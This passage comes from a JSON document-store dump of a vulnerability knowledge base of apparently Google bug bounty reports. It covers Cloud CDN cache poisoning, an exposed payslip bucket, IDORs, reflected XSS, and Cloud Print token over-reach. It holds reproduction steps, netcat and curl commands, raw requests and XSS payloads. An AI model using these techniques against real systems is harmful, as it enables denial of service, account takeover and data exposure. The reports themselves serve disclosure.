that this behavior is incorrect:\r\nA sender MUST NOT generate a bare CR (a CR character not immediately followed by LF) within any protocol elements other than the content. A recipient of such a bare CR MUST consider that element to be invalid or replace each bare CR with SP before processing the element or forwarding the message.\r\nIn other words, a recipient of a bare CR in this location has two choices:\r\nReplace it with a space\r\nReject the message\r\nThe classic application LB does neither, and instead forwards the bare CR as-is. Thus, for caching purposes, a method of\r\nGET\\r\r\nis equivalent to\r\nGET\r\n.\r\nMechanism For Exploiting the Bug\r\nThis bug can be used to poison the Google Cloud CDN cache when the following are true:\r\nNegative caching is enabled.\r\nThe origin server behind the CDN does not respond 400 to requestts with methods suffixed with\r\nThe origin server behind the CDN considers methods suffixed with\r\nas distinct from their un-suffixed counterparts.\r\nIt turns out that there are many such HTTP servers. Here are some examples:\r\nTornado\r\nLighttpd\r\nCherryPy\r\nLibsoup\r\nLibevent\r\nHow to Exploit the Bug\r\nTo reproduce the cache poisoning attack for yourself, do the following:\r\nConfigure a Google Cloud Classic Application Load Balancer, and enable Cloud CDN with negative caching.\r\nPoint the LB at port 80 on a machine you control with a publicly-routable IP.\r\nStart an instance of Lighttpd on that machine on port 80, with the server root set to\r\n/var/www/html\r\n. (This is the server root in the default configuration file. This step should thus be as simple as\r\napt -y install lighttpd && lighttpd -f /etc/lighttpd/lighttpd.conf\r\n)\r\nMake a file called\r\nindex.html\r\nin the server root, and put some data in it:\r\necho 'Hello world!' > /var/www/html/index.html\r\nSend the following request to the LB:\r\nGET /index.html HTTP/1.1\\r\\n\r\nHost: <your host name>\\r\\n\r\nObserve that the server responds with the content of the file:\r\nHTTP/1.1 200 OK\\r\\n\r\nContent-Type: text/html\\r\\n\r\nETag: \"1820227750\"\\r\\n\r\nLast-Modified: Thu, 06 Jun 2024 23:52:45 GMT\\r\\n\r\nContent-Length: 13\\r\\n\r\nAccept-Ranges: bytes\\r\\n\r\nDate: Fri, 07 Jun 2024 00:28:15 GMT\\r\\n\r\nServer: lighttpd/1.4.74\\r\\n\r\nHello world!", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 3108, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "b7cee880-6dd0-4db0-84ab-031920f0eaa1": {"__data__": {"id_": "b7cee880-6dd0-4db0-84ab-031920f0eaa1", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175640_562711.clean.txt", "file_name": "20250408_175640_562711.clean.txt", "file_type": "text/plain", "file_size": 4044, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "cf35c627-405b-4dbb-b7d4-be24d068b174", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175640_562711.clean.txt", "file_name": "20250408_175640_562711.clean.txt", "file_type": "text/plain", "file_size": 4044, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "72bfe8796145365ed188ac49a96d148c447acd2ff3c709dbccfb6b82e0175f05", "class_name": "RelatedNodeInfo"}, "2": {"node_id": "e2f36a02-915e-40e3-9f20-8e9bf536624c", "node_type": "1", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175640_562711.clean.txt", "file_name": "20250408_175640_562711.clean.txt", "file_type": "text/plain", "file_size": 4044, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "86636d372b621654daa6993125aae978466f75068cf3c44ce920b10c7cbb599c", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "> /var/www/html/index.html\r\nSend the following request to the LB:\r\nGET /index.html HTTP/1.1\\r\\n\r\nHost: <your host name>\\r\\n\r\nObserve that the server responds with the content of the file:\r\nHTTP/1.1 200 OK\\r\\n\r\nContent-Type: text/html\\r\\n\r\nETag: \"1820227750\"\\r\\n\r\nLast-Modified: Thu, 06 Jun 2024 23:52:45 GMT\\r\\n\r\nContent-Length: 13\\r\\n\r\nAccept-Ranges: bytes\\r\\n\r\nDate: Fri, 07 Jun 2024 00:28:15 GMT\\r\\n\r\nServer: lighttpd/1.4.74\\r\\n\r\nHello world!\r\nSend the following request to the LB (this should poison the cache):\r\nGET\\r /index.html HTTP/1.1\\r\\n\r\nObserve that the server responds 501, indicating that Lighttpd doesn't support the\r\nmethod:\r\nHTTP/1.1 501 Not Implemented\\r\\n\r\nContent-Length: 170\\r\\n\r\nDate: Fri, 07 Jun 2024 00:28:25 GMT\\r\\n\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n<head>\r\n<meta charset=\"UTF-8\" />\r\n<title>501 Not Implemented</title>\r\n</head>\r\n<body>\r\n<h1>501 Not Implemented</h1>\r\n</body>\r\n</html>\r\nTry sending the first request again, and observe that it now also elicits a 501 response:\r\nprintf 'GET /index.html HTTP/1.1\\r\\nHost: whatever\\r\\n\\r\\n' | nc <your LB IP> <your LB port>\r\nDate: Fri, 07 Jun 2024 00:31:54 GMT\\r\\n\r\nAge: 4\\r\\n\r\nThus, the cache has been poisoned.\r\nAttack scenario\r\nAn attacker can use this vulnerability to deny service to sites that use negative caching on the classic app. LB, paired with any of the servers listed earlier, such as Lighttpd.", "mimetype": "text/plain", "start_char_idx": 2663, "end_char_idx": 4044, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "f1ef5ea8-1e32-46b3-b17a-978edc5a34bc": {"__data__": {"id_": "f1ef5ea8-1e32-46b3-b17a-978edc5a34bc", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175640_499643.clean.txt", "file_name": "20250408_175640_499643.clean.txt", "file_type": "text/plain", "file_size": 408, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "2adfc389-1945-44d4-a04f-20678d22df81", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175640_499643.clean.txt", "file_name": "20250408_175640_499643.clean.txt", "file_type": "text/plain", "file_size": 408, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "eba9321a6cc3939db5c6c51e7016bafab375d37bd887ee49787b3cbe8392e1de", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary: I am able to download xoogler payslips files\r\nSteps to reproduce:\r\nClick on the page and it will show the file details\r\nappend the zip file name from the url output  to\r\nhttps://storage.googleapis.com/xoogler-payday/\r\nBrowser/OS:\r\nAttack scenario:\r\nPeople would be able to download the payslips.\r\nHowever zip file is protected by password, still I am able to download and bruteforced can be applied.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 408, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "9a7b8504-d07f-404a-b406-d6f649ada750": {"__data__": {"id_": "9a7b8504-d07f-404a-b406-d6f649ada750", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175721_910820.clean.txt", "file_name": "20250408_175721_910820.clean.txt", "file_type": "text/plain", "file_size": 562, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "1548c67f-2509-40d8-b9ab-3d72418fb55e", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175721_910820.clean.txt", "file_name": "20250408_175721_910820.clean.txt", "file_type": "text/plain", "file_size": 562, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "917390321b7b827318e2a3609ce685d77143ae79372273de3b677780eb0e7d00", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary: IDOR in\r\nhttps://applieddigitalskills.withgoogle.com/s/en/home\r\nSteps to reproduce:\r\nGo to\r\nhttps://applieddigitalskills.withgoogle.com\r\nand sign in into your account\r\nNow , make sure that you are using the \"Teacher\" Platform\r\nAll you need to add in the url is \"/course/classcode#units\"\r\nYou will be able to view the course units and the page is still being available\r\nAttack scenario:\r\nEven though a teacher is not associated with a particular class , he or she is able to view the page where the class courses and the rest of the details are specified", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 562, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "b89fcaa2-bada-4b59-a662-4246916208d5": {"__data__": {"id_": "b89fcaa2-bada-4b59-a662-4246916208d5", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175715_030528.clean.txt", "file_name": "20250408_175715_030528.clean.txt", "file_type": "text/plain", "file_size": 1633, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "79c4ed0e-e7dd-4872-97ee-3ae2bf617cb4", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175715_030528.clean.txt", "file_name": "20250408_175715_030528.clean.txt", "file_type": "text/plain", "file_size": 1633, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "108bac887ca553d5c80e8b77c19f6c8805affebc726a75273d67ba0a2358cdb6", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nReflected XSS(CROSS SITE SCRIPTING) in\r\nhttps://www.waze.com\r\nProduct:\r\nURL:\r\nhttps://www.waze.com/carpool/companies?city=\r\nVulnerability type:\r\nCross-site scripting (XSS)\r\nDetails\r\nHi security team, the\r\nhttps://waze.com\r\nwebsite is your. i found a interesting vulnerability in your website is cross site scripting and HTML injection.let me explain little bit about cross site scripting.cross site scripting is attack. when and application receives data in an HTTP request and includes that data with the immediate response in unsafe way.in a simple way attacker can put malicious payload into a website and website reflected back those payload.so attacker can easily takeover the account and steal victim cookie.\r\nAttack scenario\r\ni am testing in\r\nwebsite and i found a interesting endpoint\r\nthis URL is vulnerable to cross site scripting. i was checking the website is vulnerable or not to XSS i insert a payload end to the URL and payload was trigger. maybe website doesn't properly sanitized a input.\r\nstep to reproduce.\r\n1: go to\r\n2: and add a payload\r\npayload => \"><img src=x onerror=alert(document.domain)>\r\n3: XSS will be triggered.\r\ni think pop is enough my side to show the XSS vulnerability.\r\nIMPACT:\r\nthe impact reflected xss is high.an attacker can impersonate a legitimate user and take over their account.if a victim user has administrative privileges, it might lead to severe damage such as modification in code or database to further weaken the security of the web application, depending on the rights of the account and the web application\r\nReporter would like to donate a possible VRP reward to charity.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1633, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "ce888102-0ec1-41fc-98c1-9e929d6d9ff7": {"__data__": {"id_": "ce888102-0ec1-41fc-98c1-9e929d6d9ff7", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175731_111570.clean.txt", "file_name": "20250408_175731_111570.clean.txt", "file_type": "text/plain", "file_size": 1415, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "2ac987c9-e972-40e7-aa29-ee667ce146bf", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175731_111570.clean.txt", "file_name": "20250408_175731_111570.clean.txt", "file_type": "text/plain", "file_size": 1415, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "cb8d147535f1d054cb3c5208aff101fed33ad4e781f46dae3c327fc9f5204dd0", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nhttps://www.googleapis.com/auth/cloudprint\r\nscope may read unfinished document\r\nSteps to reproduce:\r\nObtain OAuth token with\r\nscope - You can do it easier with OAuth 2.0 Playground\r\nPrint any document to offline printer - Now Pending job was created.\r\ncurl \"https://www.google.com/cloudprint/jobs\" -H \"X-CloudPrint-Proxy: ASDF\" -H \"Authorization: OAuth <OBTAINED_OAUTH_TOKEN>\"\r\nto get fileUrl of above job.\r\ncurl \"<FILE_URL>\" -H \"X-CloudPrint-Proxy: ASDF\" -H \"Authorization: OAuth <OBTAINED_OAUTH_TOKEN>\"\r\nto get document file.\r\nBrowser/OS: Any\r\nAttack scenario:\r\nscope is explained on OAuth page as this:\r\nManage your printers\r\n- View and manage your printers in Google CloudPrint\r\n- Print documents on your CloudPrint printers\r\nI showed that the token which includes above scope may read pending document, and it's not included in this explaining. Also, in my opinion, this is wrong Authorization; Maybe user thinks this permission can't read printing content, and I believe it's Google's intent.\r\nLet's assume attacker provides 'Daily Newspaper Printing Service', and it requires Google's OAuth token with CloudPrint scope. An user will understand its requiring; it's really needed for the service. But, attacker can read unfinished document with this vuln. Because every document starts with unfinished, attacker can read about every document that is printed with the user's Google CloudPrint Service.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1415, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "ad0cd368-1d2b-4c45-9b68-8d2bba6f3e3a": {"__data__": {"id_": "ad0cd368-1d2b-4c45-9b68-8d2bba6f3e3a", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175705_907322.clean.txt", "file_name": "20250408_175705_907322.clean.txt", "file_type": "text/plain", "file_size": 2507, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "685a381b-0f52-48ff-8716-b33acc4cf1aa", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175705_907322.clean.txt", "file_name": "20250408_175705_907322.clean.txt", "file_type": "text/plain", "file_size": 2507, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "e10cf7c18ccd969b1dd55e355abfc8fdbf8779e76382d4cd27a3aad0e3f9c174", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nXSS by exploiting CSRF vulnerability\r\nProduct:\r\nOpen source project - Google Cloud Platform:  \"Code samples used on cloud.google.com\"\r\nURL:\r\nhttps://github.com/GoogleCloudPlatform/python-docs-samples/tree/main\r\nVulnerability type:\r\nCross-site scripting (XSS)\r\nDetails\r\nHey Google security team,\r\nRecently I reviewed the source code of your open-source project and identified a potential security risk in your code.\r\nProduct: >\r\nhttps://github.com/GoogleCloudPlatform/python-docs-samples\r\nVulnerable code\r\n\u2193\r\n@app.route('/example_task_handler', methods=['POST'])\r\ndef example_task_handler():\r\n\"\"\"Log the request payload.\"\"\"\r\npayload = request.get_data(as_text=True) or '(empty payload)'\r\nprint('Received task with payload: {}'.format(payload))\r\nreturn 'Printed task payload: {}'.format(payload)\r\nCode link\r\nhttps://github.com/GoogleCloudPlatform/python-docs-samples/blob/a63091cdbde2536f2109bceaab7422f1261600ed/appengine/flexible/tasks/main.py#L28\r\nVulnerability\r\nCheck the code and you can see the unsanitized input from the HTTP request body flows into the return value of\r\nexample_task_handler\r\nwhere it is used to render an HTML page returned to the user. This result in a Cross-Site Scripting attack (XSS)\r\nChaining the bug\r\nAs you see, only HTTP POST method is allowed  ---> @app.route('/example_task_handler', methods=['POST'])\r\nand thus I'm chaining this with CSRF to create a meaningful impact.\r\nReproduction steps\r\nRun the python code (Start the service)\r\nVisit the service and check /example_task_handler\r\nOnce you get the \"Method not allowed\" error, intercept the  request and change the method type (GET to POST)\r\nNow we can trigger the XSS payload\r\nChain it with CSRF\r\nProof of Concept\r\nhttps://drive.google.com/file/d/17kjfdqf5iG8VMktHqIsy9IzU8ZwR8cHD/view?usp=sharing\r\nWhile chaining the bug XSS with CSRF, change the Content-Type: application/x-www-form-urlencoded to text/html\r\nCSRF PoC\r\nVideo Link: >\r\nConclusion\r\nSanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches.\r\nCSRF Prevention\r\nI hope it helps!\r\nCheers,\r\nAttack scenario\r\nThe attacker causes the victim user to carry out an action unintentionally via exploiting CSRF\r\nThe attacker can execute malicious scripts on victim's browser: XSS\r\nThis vulnerability can chain to create critical security issues\r\nAffect the trust of the product\r\n& Many more\r\nRegards,", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2505, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "50bb1c6e-bd2e-49cd-bb81-d1135c6e6680": {"__data__": {"id_": "50bb1c6e-bd2e-49cd-bb81-d1135c6e6680", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175703_419142.clean.txt", "file_name": "20250408_175703_419142.clean.txt", "file_type": "text/plain", "file_size": 1342, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "c1066eff-6d15-4f4b-a060-2454c7cd599f", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175703_419142.clean.txt", "file_name": "20250408_175703_419142.clean.txt", "file_type": "text/plain", "file_size": 1342, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "f85e86a29fc3a18f3aa415c6fd743ed565c7501e1cea5e2f8d2262bcf5d304c3", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nXSS on\r\nhttps://websdk.ujet.co\r\nProduct:\r\nGoogle Cloud\r\nURL:\r\nhttps://cloud.google.com/contact-center/ccai-platform/docs/Guide/publication--en?hl=en\r\nVulnerability type:\r\nCross-site scripting (XSS)\r\nDetails\r\nUsing the chat message feature of Cloud Contact Center an agent can XSS the user on\r\nby messaging https://\"onmousemove=\"alert(window.origin)\" this will alert on mouse movement over the link.\r\nThis can also be done by setting a custom \"Waiting for Agent Assignment Message\" like\r\n<img src=x onerror=alert(window.origin)>\r\nOriginally reported in issue 258549653\r\nhttps://cloud.google.com/contact-center/ccai-platform/docs/Customizing_Languages__Recordings____Messages?hl=en\r\nAttack scenario\r\nis a shared origin used to render all chat sessions from Cloud Contact Center.\r\nAny website with there own chat can hijack a different websites chat session via the window opener.\r\nIt may also be possible to force a websites chat open and view the history by abusing proactive.html which also seems to allow for sending requests as the SDK and getting the response via postMessage but I cant test it currently since the test instance is no longer running.\r\nHaving an XSS on\r\nalso increases the attack surface of the victims website for example its a origin thats trusted by cobrowse which is a feature of the SDK\r\nhttps://cobrowse.io/", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1342, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "ab30ee0c-b392-467c-bd16-e3912f29e3e2": {"__data__": {"id_": "ab30ee0c-b392-467c-bd16-e3912f29e3e2", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175719_689337.clean.txt", "file_name": "20250408_175719_689337.clean.txt", "file_type": "text/plain", "file_size": 0, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "32a2abc1-b78d-4e66-a904-4842acb5707f", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175719_689337.clean.txt", "file_name": "20250408_175719_689337.clean.txt", "file_type": "text/plain", "file_size": 0, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "4bf629e4e0516328a0dcd73b6b13fc300dea193b65419a78481ed0a464900474", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 0, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "6ea0b4dd-1099-4dba-a6e6-3ed1894f5dfe": {"__data__": {"id_": "6ea0b4dd-1099-4dba-a6e6-3ed1894f5dfe", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175733_437848.clean.txt", "file_name": "20250408_175733_437848.clean.txt", "file_type": "text/plain", "file_size": 473, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "aa4bda74-e719-4b41-a232-c6a13b73a470", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175733_437848.clean.txt", "file_name": "20250408_175733_437848.clean.txt", "file_type": "text/plain", "file_size": 473, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "8610c2472e66f33be7906ecc1f9edd2cefa52b71e20176866cef5471549c16f0", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary: You can see information that has already been deleted and is not available.\r\nGo to:\r\nhttps://goo.gl/forms/PaEqkgairdXSNNnq2\r\nYou will see that the Form is closed\r\nWe can see what's already deleted\r\nView the source of the page\r\nhttps://drive.google.com/open?id=1JAcmZz1a-8mYv9uOQxxXGLCWgcjSgEMF\r\nAttack scenario:\r\nYou can see information that has already been deleted and is not available.\r\nI would not want anyone to see what this form was after removing the form.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 473, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "36d9ac75-0d33-40e9-a14c-c9b2fc4fc7e4": {"__data__": {"id_": "36d9ac75-0d33-40e9-a14c-c9b2fc4fc7e4", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175708_071438.clean.txt", "file_name": "20250408_175708_071438.clean.txt", "file_type": "text/plain", "file_size": 1738, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "1427eb19-d3c4-49ae-a02a-c3126732870f", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175708_071438.clean.txt", "file_name": "20250408_175708_071438.clean.txt", "file_type": "text/plain", "file_size": 1738, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "55d44f2d44a6b18a295b494deaa4c457d801f5d4a540a8d7139ce33e17b006eb", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nIDOR allow to remove any Members in  Google chat  Spaces\r\nThe vulnerability is known to third parties!\r\nProduct:\r\nGoogle Chat\r\nURL:\r\nhttps://mail.google.com/chat/u/0/#chat/space\r\nVulnerability type:\r\nPrivilege Escalation\r\nDetails\r\nWhen using Google Spaces, the creator automatically becomes the Space Manager who can remove and add participants.\r\nDue to the IDOR vulnerability, an attacker could be able to remove the Space Manager from a Space and remove any member from any Space.\r\nThis vulnerability consists in:\r\nPOST /u/0/_/DynamiteWebUi/data/batchexecute?rpcids=itoCId&source-path=%2Fu%2F0%2Fmole%2Fworld&f.sid=2214863011575308312&bl=boq_dynamiteuiserver_20220624.01_p0&hl=en&soc-app=1&soc-platform=1&soc-device=1&_reqid=14582833&rt=c HTTP/2\r\nHost: chat.google.com\r\nBy changing the Space ID and user ID , an attacker could remove any member or Manager from Space.\r\nSteps to reproduce :\r\nGo to\r\nhttps://mail.google.com/chat/u/0/#chat/space/xxxxx\r\nfrom the attacker's account .\r\nOpen \" View Members\" and click \"Remove from space\"\r\nStart intercepting the post request and you'll get\r\n[[[\"itoCId\",\"[[],[\\\"space/AAAAuypwSbs\\\",\\\"AAAAuypwSbs\\\",2],4,[[\\\"user/105599426893724266332\\\",null,\\\"105599426893724266332\\\",null,[\\\"105599426893724266332\\\",\\\"human/105599426893724266332\\\",0],\\\"user/human/105599426893724266332\\\"]],null,null,[]]\",null,\"generic\"]]]&at=ALDO5-NfcbsvAFhduORqxN84kZGt:1656869432201&\r\nSpace ID : AAAAuypwSbs\r\nUser ID : 105599426893724266332\r\nReplace the User ID with the Space Manager ID, then send the request.\r\nThe Space Manager will be kicked out of the space.\r\nBy changing the space ID and user ID , we can remove any space member in Google chat\r\nAttack scenario\r\nA malicious actor can remove any space member.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1738, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "e6ba7f7f-b657-4c86-a974-501326c88177": {"__data__": {"id_": "e6ba7f7f-b657-4c86-a974-501326c88177", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175722_020976.clean.txt", "file_name": "20250408_175722_020976.clean.txt", "file_type": "text/plain", "file_size": 0, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "22e6772f-0557-485d-81fd-3eb4bec7df24", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175722_020976.clean.txt", "file_name": "20250408_175722_020976.clean.txt", "file_type": "text/plain", "file_size": 0, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "28eaed6091fba17983ef0dfcf61a149d76110335a842fa9a80d23cbac4d272a9", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 0, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "46badc81-4deb-4923-a91f-02928581c3fd": {"__data__": {"id_": "46badc81-4deb-4923-a91f-02928581c3fd", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175731_011003.clean.txt", "file_name": "20250408_175731_011003.clean.txt", "file_type": "text/plain", "file_size": 997, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "55230178-4002-4de5-8e3d-da2937f692ae", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175731_011003.clean.txt", "file_name": "20250408_175731_011003.clean.txt", 